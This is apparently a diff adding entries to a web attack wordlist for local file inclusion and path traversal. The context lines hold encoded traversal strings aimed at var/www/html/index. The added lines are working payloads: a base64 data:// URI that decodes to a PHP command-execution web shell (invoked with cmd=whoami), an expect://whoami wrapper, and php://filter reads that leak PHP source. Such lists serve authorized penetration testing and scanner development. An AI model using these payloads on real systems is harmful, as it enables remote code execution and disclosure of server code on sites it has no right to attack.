@@ -166,3 +166,9 @@
 %ef%bc%bc%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%bc%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%bc%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%bc%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8evar%ef%bc%8fwww%ef%bc%8fhtml%ef%bc%8findex
 %ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8fvar%ef%bc%8fwww%ef%bc%8fhtml%ef%bc%8findex
 %ef%bc%bc%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8f%ef%bc%8f%ef%bc%8fvar%ef%bc%8fwww%ef%bc%8fhtml%ef%bc%8findex
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=whoami
+expect://whoami
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index
+index
+index.php
